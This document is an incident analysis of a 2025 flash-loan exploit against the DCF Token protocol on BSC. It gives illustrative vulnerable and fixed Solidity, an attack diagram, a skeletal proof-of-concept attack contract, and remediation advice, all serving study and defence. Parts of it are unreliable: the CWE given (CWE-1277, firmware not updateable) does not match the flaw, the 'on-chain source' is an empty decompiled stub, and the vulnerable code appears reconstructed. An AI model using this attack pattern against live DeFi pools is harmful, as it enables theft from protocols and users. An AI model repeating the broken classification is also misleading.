# DCF Token — AMM Price Manipulation via Flash Loan Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-01 |
| **Protocol** | DCF Token |
| **Chain** | BSC |
| **Loss** | ~442,000 USD |
| **Attacker** | [0x00c58434f247dfdca49b9ee82f3013bac96f60ff](https://bscscan.com/address/0x00c58434f247dfdca49b9ee82f3013bac96f60ff) |
| **Attack Tx** | [0xb375932...](https://bscscan.com/tx/0xb375932951c271606360b6bf4287d080c5601f4f59452b0484ea6c856defd6fd) |
| **Vulnerable Contract** | [0x8487f846d59f8fb4f1285c64086b47e2626c01b6](https://bscscan.com/address/0x8487f846d59f8fb4f1285c64086b47e2626c01b6) |
| **Root Cause** | The `swapDCFtoDCT` function determines the DCT exchange rate by relying on the manipulable instantaneous spot price of the LP pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/DCFToken_exp.sol) |

---

## 1. Vulnerability Overview

The DCF Token protocol operated two types of tokens: DCF and DCT. The attacker borrowed a large amount of BUSD via a PancakeSwap V3 flash loan to manipulate the price of the DCF/BUSD pool. By leveraging the manipulated price, the attacker swapped DCT tokens at a favorable rate, yielding approximately $440,000 in profit. The DCF token was vulnerable to price manipulation because its internal swap mechanism referenced the instantaneous spot price of an external LP pool.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable price reference: uses spot price
function getSwapRate() internal view returns (uint256) {
    // Directly references current reserves of the LP pool
    (uint112 reserve0, uint112 reserve1,) = IPancakePair(DCF_BUSD_PAIR).getReserves();
    return reserve1 / reserve0; // ❌ Spot price — manipulable
}

function swapDCFtoDCT(uint256 dcfAmount) external {
    uint256 rate = getSwapRate(); // ❌ References manipulated price
    uint256 dctAmount = dcfAmount * rate;
    IERC20(DCT).transfer(msg.sender, dctAmount);
}

// ✅ Correct code: use TWAP
function getSwapRate() internal view returns (uint256) {
    // Use Uniswap V2 TWAP or Chainlink Oracle
    return IOracle(priceOracle).getPrice(DCF, BUSD); // ✅ Manipulation-resistant price
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: DCFToken_decompiled.sol
contract DCFToken {
    function swap(uint256 a, uint256 b, address c, bytes calldata d) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V3 Flash Loan (borrow large amount of BUSD)
  │
  ├─[2]─► Buy large amount of DCF tokens with BUSD
  │         └─► DCF price spikes (BUSD/DCF ratio shifts)
  │
  ├─[3]─► Call internal swap function of DCF protocol
  │         └─► Swap DCF → DCT at manipulated price (favorable exchange rate)
  │
  ├─[4]─► Exchange DCT → BUSD (at market price)
  │
  ├─[5]─► Re-exchange DCF → BUSD (price normalizes)
  │         └─► Sell initially purchased DCF
  │
  ├─[6]─► Repay flash loan (BUSD + fees)
  │
  └─[7]─► Net profit: ~442,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Attack_Contract {
    function exploit() public {
        // [1] Borrow large amount of BUSD via PancakeSwap V3 flash loan
        IPancakeV3Pool(DCF_BUSD_V3_POOL).flash(
            address(this), 0, LARGE_BUSD_AMOUNT, ""
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // [2] Buy large amount of DCF with BUSD → manipulate DCF price
        IERC20(BUSD).approve(PANCAKE_ROUTER, type(uint256).max);
        // swapExactTokensForTokens(BUSD → DCF)...

        // [3] Swap DCF → DCT favorably at manipulated price
        // Call DCF protocol internal function (mint DCT based on inflated DCF price)
        IERC20(DCF).approve(DCF_PROTOCOL, type(uint256).max);
        // IDCFProtocol(DCF_PROTOCOL).swap(...)

        // [4] Exchange DCT for BUSD to realize profit
        // [5] Sell DCF back to BUSD
        // [6] Repay flash loan
        IERC20(BUSD).transfer(msg.sender, LARGE_BUSD_AMOUNT + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Technique** | Flash Loan + AMM Spot Price Manipulation |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-1277: Firmware Not Updateable |
| **Severity** | Critical |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Use a Time-Weighted Average Price instead of the instantaneous spot price.
2. **Chainlink Integration**: Use a trusted external price feed.
3. **Price Deviation Cap**: Set an upper bound on the allowable price deviation within a single transaction.
4. **Flash Loan Defense**: Implement a circuit breaker that temporarily halts swaps when large liquidity changes occur within the same block.

## 7. Lessons Learned

- **Danger of Spot Prices**: The current spot price of an AMM can be easily manipulated via flash loans and must not be used as a price oracle.
- **Multi-Token Tokenomics Design**: When exchange rates between multiple tokens are embedded in internal logic, all external price manipulation vectors must be carefully analyzed.
- **Pattern Behind Large Losses**: The $440,000 loss resulted from a single flash loan + price manipulation pattern, which is one of the most common attack patterns in DeFi.